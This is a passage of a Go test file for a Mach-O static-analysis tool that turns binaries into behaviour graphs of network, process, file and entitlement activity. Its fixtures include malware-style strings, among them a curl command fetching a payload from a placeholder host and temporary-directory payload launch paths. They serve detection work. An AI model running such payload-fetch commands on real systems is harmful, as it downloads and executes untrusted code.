package extract

import (
	"bytes"
	"debug/macho"
	"encoding/binary"
	"fmt"
	"io"
	"slices"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func assertUnresolvedNativePrimitive(t *testing.T, graph *behavior.Graph, kind behavior.OperationKind, resourceKind behavior.ResourceKind) {
	t.Helper()
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != kind {
		t.Fatalf("native primitive = %#v, want one %s operation", graph.Operations, kind)
	}
	resource := graph.Operations[0].RequiredResource()
	if resource.Kind != resourceKind || resource.Value != "" || graph.Operations[0].Qualifiers["resource_binding"] != "unresolved" {
		t.Fatalf("native primitive must retain an unresolved %s resource: %#v", resourceKind, graph.Operations[0])
	}
}

func TestNormalizeEntitlementString(t *testing.T) {
	tests := map[string]string{
		"com.apple.security.network.client":                    "com.apple.security.network.client",
		"<key>com.apple.private.CoreAuthentication.SPI</key>":  "com.apple.private.CoreAuthentication.SPI",
		"&com.apple.private.platformsso.security":              "com.apple.private.platformsso.security",
		"(com.apple.private.example":                           "com.apple.private.example",
		"prefix com.apple.security.application-groups\x00tail": "com.apple.security.application-groups",
	}
	for input, want := range tests {
		got, ok := normalizeEntitlementString(input)
		if !ok || got != want {
			t.Fatalf("normalizeEntitlementString(%q) = %q, %v; want %q, true", input, got, ok, want)
		}
	}
	if got, ok := normalizeEntitlementString("com.example.not-an-entitlement"); ok {
		t.Fatalf("normalizeEntitlementString returned %q for unrelated string", got)
	}
}

func TestExtractEntitlementStringsSkipsWhenXMLWasParsed(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ev := graph.AddEvidence(behavior.Evidence{NodeID: content.NodeID, Method: "macho-code-signature", Kind: "entitlements-xml", Arch: "arm64"})
	graph.ArtifactProperties = append(graph.ArtifactProperties, behavior.ArtifactProperty{NodeID: content.NodeID, Kind: "entitlements-xml", Value: "present", EvidenceIDs: []string{ev}, Support: behavior.SupportDirect})

	extractEntitlementStrings(&graph, content, "arm64", []byte("com.apple.security.get-task-allow\x00"), false)

	if len(graph.ArtifactProperties) != 1 {
		t.Fatalf("raw entitlement fallback should not run after parsed XML entitlements: %#v", graph.ArtifactProperties)
	}
	for _, evidence := range graph.Evidence {
		if evidence.Kind == "entitlement-string" {
			t.Fatalf("unexpected raw entitlement-string evidence after parsed XML entitlements: %#v", graph.Evidence)
		}
	}
}

func TestMachODylibNetworkContextDoesNotTreatSecurityAsTLS(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}

	addNetworkFeatureFromDylib(&graph, content, "/System/Library/Frameworks/Security.framework/Versions/A/Security", "arm64", "ev-1")
	if len(graph.Network) != 0 {
		t.Fatalf("Security.framework linkage alone should not imply network/TLS ownership: %#v", graph.Network)
	}

	addNetworkFeatureFromDylib(&graph, content, "/System/Library/Frameworks/Network.framework/Versions/A/Network", "arm64", "ev-2")
	if len(graph.Network) != 1 {
		t.Fatalf("missing Network.framework context: %#v", graph.Network)
	}
	if graph.Network[0].HTTPImplementation != "Apple Network.framework" || graph.Network[0].TLSProvider != "" || graph.Network[0].TLSProviderBasis != "" || graph.Network[0].TLSProfileFamily != "" {
		t.Fatalf("Network.framework linkage should not imply TLS ownership: %#v", graph.Network[0])
	}

	addNetworkFeatureFromDylib(&graph, content, "/System/Library/Frameworks/CFNetwork.framework/Versions/A/CFNetwork", "arm64", "ev-3")
	if len(graph.Network) != 2 {
		t.Fatalf("missing CFNetwork context: %#v", graph.Network)
	}
	if graph.Network[1].HTTPImplementation != "CFNetwork" || graph.Network[1].TLSProvider != "Apple system TLS provider" {
		t.Fatalf("CFNetwork should retain TLS ownership context: %#v", graph.Network[1])
	}
}

func TestMachOImportedNetworkAPIDistinguishesRawNetworkFromTLS(t *testing.T) {
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	nw := apiNetworkImplementation(behavior.NetworkImplementationAPIImport, content, "", "arm64", behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}, behavior.SupportDirect, "", "nw_connection_create", "ev-1", false)
	if nw.HTTPImplementation != "Apple Network.framework" || nw.TLSProvider != "" {
		t.Fatalf("nw_connection should not imply TLS ownership: %#v", nw)
	}

	session := apiNetworkImplementation(behavior.NetworkImplementationAPIImport, content, "", "arm64", behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}, behavior.SupportDirect, "", "NSURLSession", "ev-2", false)
	if session.HTTPImplementation != "URLSession" || session.TLSProvider != "Apple system TLS provider" {
		t.Fatalf("URLSession should retain TLS ownership context: %#v", session)
	}

	handshake := apiNetworkImplementation(behavior.NetworkImplementationAPIImport, content, "", "arm64", behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown}, behavior.SupportDirect, "", "SSLHandshake", "ev-3", false)
	if handshake.HTTPImplementation != "SecureTransport" || handshake.TLSProvider != "Apple system TLS provider" {
		t.Fatalf("SSLHandshake should retain TLS ownership context: %#v", handshake)
	}
}

func TestMachOCalledTLSAndSetupAPIsDoNotBecomeConnectOperations(t *testing.T) {
	for _, symbol := range []string{"_SSLHandshake", "_nw_connection_create", "_NSURLSession"} {
		t.Run(symbol, func(t *testing.T) {
			var graph behavior.Graph
			addOperationFromCalledImportedSymbol(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "sample"}, symbol, "arm64", "ev-call", machoFunction{Name: "caller", Reachable: true})
			if len(graph.Operations) != 0 {
				t.Fatalf("called implementation/setup API %s must not become network.connect: %#v", symbol, graph.Operations)
			}
			if len(graph.Network) != 1 || graph.Network[0].Kind != behavior.NetworkImplementationAPICall || graph.Network[0].APIOrTool == "" {
				t.Fatalf("called implementation observation was not retained for %s: %#v", symbol, graph.Network)
			}
			if stringSliceContains(graph.Network[0].UnresolvedProperties, "whether imported API is reached by executable code") {
				t.Fatalf("called API should not be described as import-only: %#v", graph.Network[0])
			}
		})
	}
}

func TestMachONetworkConnectionStartRemainsOperation(t *testing.T) {
	var graph behavior.Graph
	addOperationFromCalledImportedSymbol(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "sample"}, "_nw_connection_start", "arm64", "ev-call", machoFunction{Name: "caller", Reachable: true})
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" {
		t.Fatalf("nw_connection_start should model a connection operation: %#v", graph.Operations)
	}
}

func TestImportedLibraryLoadsPreserveDylibLinkageKind(t *testing.T) {
	file := &macho.File{
		FileHeader: macho.FileHeader{Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			macho.LoadBytes(encodeTestDylibLoad(lcLoadDylib, "/usr/lib/libSystem.B.dylib")),
			macho.LoadBytes(encodeTestDylibLoad(lcLoadWeakDylib, "/usr/lib/libcurl.4.dylib")),
			macho.LoadBytes(encodeTestDylibLoad(lcReexportDylib, "/usr/lib/libobjc.A.dylib")),
			macho.LoadBytes(encodeTestDylibLoad(lcLoadUpwardDylib, "/System/Library/Frameworks/CFNetwork.framework/CFNetwork")),
			macho.LoadBytes(encodeTestDylibLoad(0xd, "/usr/lib/libignored-id.dylib")),
			macho.LoadBytes(encodeTestDylibLoadWithOffset(lcLoadWeakDylib, 12, "/usr/lib/libbad.dylib")),
		},
	}

	got := importedLibraryLoads(file)
	want := []machoLibraryLoad{
		{Name: "/usr/lib/libSystem.B.dylib", Linkage: "load"},
		{Name: "/usr/lib/libcurl.4.dylib", Linkage: "weak"},
		{Name: "/usr/lib/libobjc.A.dylib", Linkage: "reexport"},
		{Name: "/System/Library/Frameworks/CFNetwork.framework/CFNetwork", Linkage: "upward"},
	}
	if len(got) != len(want) {
		t.Fatalf("importedLibraryLoads() = %#v; want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("importedLibraryLoads()[%d] = %#v; want %#v", i, got[i], want[i])
		}
	}
}

func TestExtractMachOFileAddsDylibLinkageFeatures(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	file := &macho.File{
		FileHeader: macho.FileHeader{Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			macho.LoadBytes(encodeTestDylibLoad(lcLoadWeakDylib, "/usr/lib/libcurl.4.dylib")),
		},
	}

	extractMachOFile(&graph, content, file, "arm64", nil, artifact.Options{})
	if !hasFeatureQualifier(&graph, "macho.dylib", "/usr/lib/libcurl.4.dylib", "linkage", "weak") {
		t.Fatalf("missing weak dylib qualifier: %#v", graph.Features)
	}
	if !hasFeatureQualifier(&graph, "macho.dylib.linkage", "weak", "library", "/usr/lib/libcurl.4.dylib") {
		t.Fatalf("missing weak dylib linkage feature: %#v", graph.Features)
	}
	if len(graph.Network) != 1 || graph.Network[0].Kind != behavior.NetworkImplementationDynamicLinkage || graph.Network[0].APIOrTool != "/usr/lib/libcurl.4.dylib" {
		t.Fatalf("weak libcurl dylib should still feed network enrichment: %#v", graph.Network)
	}
}

func TestMachOLCMainRequiresUniqueCompleteExecutableCommand(t *testing.T) {
	command := func(size int) macho.LoadBytes {
		raw := make([]byte, size)
		if size >= 8 {
			binary.LittleEndian.PutUint32(raw[0:4], lcMain)
			binary.LittleEndian.PutUint32(raw[4:8], uint32(size))
		}
		return macho.LoadBytes(raw)
	}
	segment := &macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 0x100, Addr: 0x1000}}
	for _, test := range []struct {
		name     string
		fileType macho.Type
		loads    []macho.Load
		want     bool
	}{
		{name: "executable", fileType: macho.TypeExec, loads: []macho.Load{segment, command(24)}, want: true},
		{name: "object", fileType: macho.TypeObj, loads: []macho.Load{segment, command(24)}},
		{name: "dylib", fileType: macho.TypeDylib, loads: []macho.Load{segment, command(24)}},
		{name: "short", fileType: macho.TypeExec, loads: []macho.Load{segment, command(16)}},
		{name: "duplicate", fileType: macho.TypeExec, loads: []macho.Load{segment, command(24), command(24)}},
	} {
		t.Run(test.name, func(t *testing.T) {
			file := &macho.File{FileHeader: macho.FileHeader{Type: test.fileType}, ByteOrder: binary.LittleEndian, Loads: test.loads}
			va, ok := machoEntrypointVA(file)
			if ok != test.want || ok && va != 0x1000 {
				t.Fatalf("entrypoint = %#x, %v, want availability %v", va, ok, test.want)
			}
		})
	}
}

func TestMachOArchitectureFilterTreatsArm64EAsArm64(t *testing.T) {
	if !architectureSelected("arm64", "arm64e") {
		t.Fatal("arm64 filter should include arm64e slices")
	}
	if architectureSelected("arm64e", "arm64") {
		t.Fatal("arm64e filter should not include generic arm64 slices")
	}
}

func TestMachOArchitectureFilterTreatsX8664HAsX8664(t *testing.T) {
	if !architectureSelected("x86_64", "x86_64h") {
		t.Fatal("x86_64 filter should include x86_64h slices")
	}
	if architectureSelected("x86_64h", "x86_64") {
		t.Fatal("x86_64h filter should not include generic x86_64 slices")
	}
}

func TestMachOArchPreservesX8664Subtype(t *testing.T) {
	if got := machoArch(macho.CpuAmd64, 8); got != "x86_64h" {
		t.Fatalf("machoArch(x86_64 subtype 8) = %q, want x86_64h", got)
	}
	if got := machoArch(macho.CpuAmd64, 3); got != "x86_64" {
		t.Fatalf("machoArch(x86_64 subtype 3) = %q, want x86_64", got)
	}
	if got := machoArch(macho.CpuAmd64, 9); got != "x86_64/0x9" {
		t.Fatalf("machoArch(x86_64 subtype 9) = %q, want x86_64/0x9", got)
	}
}

func TestExtractMachOFileReportsUnsupportedI386FunctionScope(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample-i386"}
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.Cpu386},
		ByteOrder:  binary.LittleEndian,
	}

	extractMachOFile(&graph, content, file, "i386", nil, artifact.Options{})

	if len(graph.Scopes) != 0 {
		t.Fatalf("unsupported i386 decoding created function scopes: %#v", graph.Scopes)
	}
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea != "macho-function-scope/i386" {
			continue
		}
		if coverage.Status != "skipped" || !strings.Contains(coverage.Detail, "unsupported for i386") || !strings.Contains(coverage.Detail, "structural metadata") {
			t.Fatalf("unexpected i386 function-scope coverage: %#v", coverage)
		}
		return
	}
	t.Fatalf("missing explicit i386 function-scope coverage: %#v", graph.Coverage)
}

func TestMachOLCMainMarksEntrypointFunction(t *testing.T) {
	rawMain := make([]byte, 24)
	binary.LittleEndian.PutUint32(rawMain[0:4], lcMain)
	binary.LittleEndian.PutUint32(rawMain[4:8], 24)
	binary.LittleEndian.PutUint64(rawMain[8:16], 0x120)
	file := &macho.File{
		FileHeader: macho.FileHeader{Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 0x1000, Addr: 0x100000000}},
			macho.LoadBytes(rawMain),
		},
	}
	functions := []machoFunction{
		{Name: "sub_100000100", Start: 0x100000100, End: 0x100000180},
		{Name: "main", Start: 0x100000180, End: 0x1000001c0},
	}

	markEntrypointFunction(file, functions)
	if !functions[0].Entrypoint {
		t.Fatalf("LC_MAIN entryoff should mark containing function as entrypoint: %#v", functions)
	}
	if functions[1].Entrypoint {
		t.Fatalf("LC_MAIN should not mark unrelated functions: %#v", functions)
	}
	if !functions[0].Reachable || functions[1].Reachable {
		t.Fatalf("LC_MAIN should seed only its containing function: %#v", functions)
	}
}

func TestMachOLCMainRejectsAmbiguousSegmentFileOffsetMapping(t *testing.T) {
	rawMain := make([]byte, 24)
	binary.LittleEndian.PutUint32(rawMain[0:4], lcMain)
	binary.LittleEndian.PutUint32(rawMain[4:8], 24)
	binary.LittleEndian.PutUint64(rawMain[8:16], 0x180)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Loads: []macho.Load{
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0x100, Filesz: 0x100, Addr: 0x1000}},
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0x180, Filesz: 0x100, Addr: 0x3000}},
			macho.LoadBytes(rawMain),
		},
	}
	functions := []machoFunction{
		{Name: "first_mapping", Start: 0x1080, End: 0x1100},
		{Name: "second_mapping", Start: 0x3000, End: 0x3080},
	}

	if entryVA, ok := machoEntrypointVA(file); ok {
		t.Fatalf("machoEntrypointVA() = %#x, true; want ambiguous mapping rejection", entryVA)
	}
	markEntrypointFunction(file, functions)
	for _, function := range functions {
		if function.Entrypoint || function.Reachable {
			t.Fatalf("ambiguous LC_MAIN mapping seeded reachability: %#v", functions)
		}
	}
}

func TestFileOffsetToVARejectsOverflowingSegmentMappings(t *testing.T) {
	for _, segment := range []*macho.Segment{
		{SegmentHeader: macho.SegmentHeader{Offset: ^uint64(0) - 7, Filesz: 16, Addr: 0x1000}},
		{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 16, Addr: ^uint64(0) - 7}},
	} {
		file := &macho.File{Loads: []macho.Load{segment}}
		if va, ok := fileOffsetToVA(file, segment.Offset); ok {
			t.Fatalf("fileOffsetToVA() = %#x, true for overflowing mapping %#v", va, segment.SegmentHeader)
		}
	}
}

func TestMachOEntrypointFunctionCallCreatesEntrypointOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addOperationFromCalledImportedSymbol(&graph, content, "_system", "x86_64", "ev-1", machoFunction{
		Name:       "sub_100000120",
		Entrypoint: true,
	})

	if len(graph.Operations) != 1 {
		t.Fatalf("expected one operation from entrypoint imported call, got %#v", graph.Operations)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("isolated extractor fixture must not invent an execution root: %#v", graph.Operations[0].Execution)
	}
	if graph.Operations[0].SourceFunction != "sub_100000120" {
		t.Fatalf("source function should preserve stripped name, got %#v", graph.Operations[0])
	}
}

func TestMachOCalledProcessAPIBindsOnlyExactArgumentPath(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runHelper", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/bin/sh",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "/bin/sh"},
		},
	})
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_system", "x86_64", "ev-call", function, machoCallContext{Argument0String: "/bin/sh"})

	if len(graph.Operations) != 1 {
		t.Fatalf("expected one operation from called process API, got %#v", graph.Operations)
	}
	if graph.Operations[0].Kind != "process.execute" || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile || graph.Operations[0].RequiredResource().Value != "/bin/sh" {
		t.Fatalf("process operation should use same-function process path xref: %#v", graph.Operations[0])
	}
	if !stringSliceContains(graph.Operations[0].EvidenceIDs, "ev-call") || len(graph.Operations[0].EvidenceIDs) != 3 {
		t.Fatalf("process operation should include call, reference, and path-literal evidence: %#v", graph.Operations[0])
	}
}

func TestMachOCalledExeclBindsOnlyExactArgumentPath(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "executeCommand", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/bin/sh",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "/bin/sh"},
		},
	})
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_execl", "x86_64", "ev-call", function, machoCallContext{Argument0String: "/bin/sh"})

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "process.execute" || graph.Operations[0].RequiredResource().Value != "/bin/sh" {
		t.Fatalf("called execl should create a function-scoped /bin/sh process operation: %#v", graph.Operations)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown || graph.Operations[0].SourceFunction != "executeCommand" {
		t.Fatalf("execl operation should preserve its function without inventing a root: %#v", graph.Operations[0])
	}
}

func TestMachONativePrimitiveBindsOnlyEvidencedCallArguments(t *testing.T) {
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "native_calls", Reachable: true}
	argument := func(value, evidence string) machoCallStringArgument {
		return machoCallStringArgument{Value: value, EvidenceIDs: []string{evidence}}
	}
	tests := []struct {
		name       string
		symbol     string
		arguments  map[int]machoCallStringArgument
		wantKind   behavior.OperationKind
		wantValues map[behavior.ResourceRole]string
	}{
		{name: "open", symbol: "_open", arguments: map[int]machoCallStringArgument{0: argument("/tmp/input.db", "ev-arg0")}, wantKind: behavior.OperationFileOpen, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "/tmp/input.db"}},
		{name: "unlinkat", symbol: "_unlinkat", arguments: map[int]machoCallStringArgument{1: argument("cache/item", "ev-arg1")}, wantKind: behavior.OperationFileDelete, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleTarget: "cache/item"}},
		{name: "renameat", symbol: "_renameat", arguments: map[int]machoCallStringArgument{1: argument("stage.tmp", "ev-source"), 3: argument("payload", "ev-target")}, wantKind: behavior.OperationFileMove, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "stage.tmp", behavior.ResourceRoleTarget: "payload"}},
		{name: "getenv", symbol: "_getenv", arguments: map[int]machoCallStringArgument{0: argument("HOME", "ev-name")}, wantKind: behavior.OperationEnvironmentRead, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "HOME"}},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			context := machoCallContext{}
			for index, item := range test.arguments {
				context.setStringArgument(index, item)
			}
			addOperationFromCalledImportedSymbolWithContext(&graph, content, test.symbol, "arm64", "ev-call", function, context)
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != test.wantKind {
				t.Fatalf("operation = %#v, want one %s", graph.Operations, test.wantKind)
			}
			operation := graph.Operations[0]
			if operation.Qualifiers["resource_binding"] != "exact-call-argument" {
				t.Fatalf("binding provenance = %#v", operation.Qualifiers)
			}
			for role, value := range test.wantValues {
				binding, ok := operation.FirstBinding(role)
				if !ok || binding.Resource.Value != value || len(binding.EvidenceIDs) == 0 {
					t.Fatalf("%s binding = %#v, want %q with evidence", role, binding, value)
				}
			}
		})
	}
}

func TestMachONativePrimitiveDoesNotBindUnevidencedOrDescriptorArguments(t *testing.T) {
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "native_calls", Reachable: true}
	for _, test := range []struct {
		name, symbol string
		context      machoCallContext
	}{
		{name: "unevidenced open string", symbol: "_open", context: machoCallContext{Argument0String: "/tmp/coincident"}},
		{name: "fstat descriptor", symbol: "_fstat", context: func() machoCallContext {
			var context machoCallContext
			context.setStringArgument(0, machoCallStringArgument{Value: "/tmp/not-a-descriptor", EvidenceIDs: []string{"ev-arg"}})
			return context
		}()},
		{name: "partial rename", symbol: "_rename", context: func() machoCallContext {
			var context machoCallContext
			context.setStringArgument(0, machoCallStringArgument{Value: "source.tmp", EvidenceIDs: []string{"ev-source"}})
			return context
		}()},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			addOperationFromCalledImportedSymbolWithContext(&graph, content, test.symbol, "x86_64", "ev-call", function, test.context)
			if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" || graph.Operations[0].Qualifiers["resource_binding"] != "unresolved" {
				t.Fatalf("unproved resource was bound: %#v", graph.Operations)
			}
		})
	}
}

func TestMachOCallArgumentEvidenceRetainsExactLocationsAndRequestedPositions(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "fat!arm64", ByteOffsetBase: 4096}
	lookup := newMachOCallLookup(&graph, content, "arm64")
	context := machoCallContext{}
	context.setStringArgument(0, machoCallStringArgument{Value: "unused", ReferenceVA: 0x1000, ReferenceOff: 16, LiteralVA: 0x3000, LiteralOffset: 128})
	context.setStringArgument(1, machoCallStringArgument{Value: "/tmp/payload", ReferenceVA: 0x1010, ReferenceOff: 32, LiteralVA: 0x3040, LiteralOffset: 192})
	context.materializeStringArgumentEvidence(lookup, machoFunction{Name: "run"}, "scope-1", 1)

	if len(graph.Evidence) != 2 || len(context.StringArguments[0].EvidenceIDs) != 0 || len(context.StringArguments[1].EvidenceIDs) != 2 {
		t.Fatalf("unexpected bounded argument evidence: evidence=%#v context=%#v", graph.Evidence, context)
	}
	if graph.Evidence[0].Offset != 4096+32 || graph.Evidence[1].Offset != 4096+192 ||
		graph.Evidence[0].VA != 0x1010 || graph.Evidence[1].VA != 0x3040 {
		t.Fatalf("argument evidence lost slice-local lineage: %#v", graph.Evidence)
	}
}

func TestMachOCallArgumentEvidenceFailsClosedAtEvidenceBudget(t *testing.T) {
	graph := behavior.Graph{EvidenceLimit: 1}
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	lookup := newMachOCallLookup(&graph, content, "x86_64")
	context := machoCallContext{}
	context.setStringArgument(0, machoCallStringArgument{Value: "/tmp/input", ReferenceVA: 0x1000, ReferenceOff: 16, LiteralVA: 0x3000, LiteralOffset: 128})
	context.materializeStringArgumentEvidence(lookup, machoFunction{Name: "open_file"}, "scope-1", 0)

	if len(context.StringArguments[0].EvidenceIDs) != 0 || graph.EvidenceLimitDrops == 0 || graph.ItemsDropped == 0 {
		t.Fatalf("evidence exhaustion did not fail closed: graph=%#v context=%#v", graph, context)
	}
}

func TestMachORustStdlibProcessWrappersRequireConcreteExecutable(t *testing.T) {
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	execFunction := machoFunction{
		Name:      "ZN3std3sys3pal4unix7process13process_inner71_$LT$impl$u20$std..sys..pal..unix..process..process_common..Command$GT$7do_exec17h0ca29777b02c6652E",
		Reachable: true,
	}

	for _, test := range []struct {
		symbol   string
		function machoFunction
	}{
		{symbol: "_execvp", function: execFunction},
		{symbol: "_posix_spawnp", function: machoFunction{
			Name:      "ZN3std3sys3pal4unix7process13process_inner71_$LT$impl$u20$std..sys..pal..unix..process..process_common..Command$GT$5spawn17h433172694d9fd321E",
			Reachable: true,
		}},
	} {
		var unresolved behavior.Graph
		addOperationFromCalledImportedSymbol(&unresolved, content, test.symbol, "arm64", "ev-call", test.function)
		if len(unresolved.Operations) != 0 {
			t.Fatalf("generic Rust stdlib %s wrapper without a recovered executable should remain neutral call evidence: %#v", test.symbol, unresolved.Operations)
		}
	}

	var concrete behavior.Graph
	addMachOStringXref(&concrete, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: execFunction,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/usr/bin/python3",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "/usr/bin/python3"},
		},
	})
	addOperationFromCalledImportedSymbolWithContext(&concrete, content, "_execvp", "arm64", "ev-call", execFunction, machoCallContext{Argument0String: "/usr/bin/python3"})
	if len(concrete.Operations) != 1 || concrete.Operations[0].RequiredResource().Value != "/usr/bin/python3" {
		t.Fatalf("a Rust stdlib wrapper with a same-function concrete executable should retain the process operation: %#v", concrete.Operations)
	}

	var application behavior.Graph
	addOperationFromCalledImportedSymbol(&application, content, "_execvp", "arm64", "ev-call", machoFunction{Name: "run_child", Reachable: true})
	if len(application.Operations) != 1 || application.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("an application-owned unresolved exec call must not be suppressed as a Rust stdlib wrapper: %#v", application.Operations)
	}
}

func TestTemporaryProcessLaunchPathRejectsDataFiles(t *testing.T) {
	tests := []struct {
		path string
		want bool
	}{
		{path: "/tmp/payload", want: true},
		{path: "/tmp/.payload", want: true},
		{path: "/private/tmp/stage.sh", want: true},
		{path: "/var/tmp/agent.bin", want: true},
		{path: "/tmp/.cache_%d.png", want: false},
		{path: "/tmp/.ent.plist", want: false},
		{path: "/private/tmp/archive.zip", want: false},
		{path: "/Applications/Foo.app/Contents/Resources/icon.png", want: false},
		{path: "/Applications/Foo.app/Contents/Info.plist", want: false},
		{path: "/Applications/Foo.app/Contents/MacOS/Foo", want: true},
		{path: "/Applications/Foo Bar.app/Contents/MacOS/Foo Bar", want: true},
		{path: "/Applications/Foo Bar.app/Contents/MacOS/agent", want: true},
		{path: "/usr/bin/curl -s https://example.invalid/payload", want: false},
		{path: "/usr/bin/python3 script.py", want: false},
		{path: "/usr/bin/open-aError./.cargo/registry/src/example/file.rs", want: false},
		{path: "/usr/bin/open-a/rustc/example/library/alloc/src/vec/mod.rs", want: false},
		{path: "/bin/sh script.sh", want: false},
		{path: "/usr/sbin/system_profiler SPHardwareDataType", want: false},
		{path: "/usr/local/bin/tool/nested", want: false},
		{path: "/opt/homebrew/bin/tool/nested", want: false},
		{path: "/Applications/Foo.app/Contents/MacOS/Foo --flag", want: false},
	}
	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			if got := looksProcessLaunchPath(tt.path); got != tt.want {
				t.Fatalf("looksProcessLaunchPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestUnscopedProcessPathFeaturesArePossibleBoundedAndDoNotBindOperations(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	seen := map[string]bool{}
	retained := 0

	addMachOUnscopedProcessPathFeature(&graph, content, "arm64", "/tmp/.cache_%d.png", 10, seen, &retained)
	addMachOUnscopedProcessPathFeature(&graph, content, "arm64", "/usr/sbin/system_profiler</string>", 20, seen, &retained)
	addMachOUnscopedProcessPathFeature(&graph, content, "arm64", "/usr/sbin/system_profiler", 30, seen, &retained)
	if len(graph.Features) != 1 || retained != 1 {
		t.Fatalf("expected one deduplicated executable-path feature and no PNG feature: features=%#v retained=%d", graph.Features, retained)
	}
	feature := graph.Features[0]
	if feature.Key != "macho.process_launch_path" || feature.Value != "/usr/sbin/system_profiler" || feature.Support != behavior.SupportHeuristic || feature.SourceFunction != "" || feature.ScopeID != "" || feature.Qualifiers["binding"] != "unscoped" {
		t.Fatalf("binary-wide process path must remain an explicitly unscoped possible feature: %#v", feature)
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("an unscoped process path must not create or bind an operation: %#v", graph.Operations)
	}

	for retained < maxMachOUnscopedProcessPaths {
		path := fmt.Sprintf("/usr/bin/tool-%03d", retained)
		if !addMachOUnscopedProcessPathFeature(&graph, content, "arm64", path, retained+100, seen, &retained) {
			t.Fatalf("path feature was capped before %d items", maxMachOUnscopedProcessPaths)
		}
	}
	if addMachOUnscopedProcessPathFeature(&graph, content, "arm64", "/usr/bin/one-too-many", 999, seen, &retained) {
		t.Fatalf("path feature beyond the explicit cap should report truncation")
	}
	if len(graph.Features) != maxMachOUnscopedProcessPaths || len(graph.Evidence) != maxMachOUnscopedProcessPaths {
		t.Fatalf("unscoped process-path retention exceeded cap: features=%d evidence=%d", len(graph.Features), len(graph.Evidence))
	}
}

func TestMachOCalledConnectDoesNotTreatSameFunctionLiteralAsSockaddr(t *testing.T) {
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "dial", Reachable: true}

	var withoutDestination behavior.Graph
	addOperationFromCalledImportedSymbol(&withoutDestination, content, "_connect", "x86_64", "ev-connect", function)
	assertUnresolvedNativePrimitive(t, &withoutDestination, behavior.OperationSocketConnect, behavior.ResourceSocket)
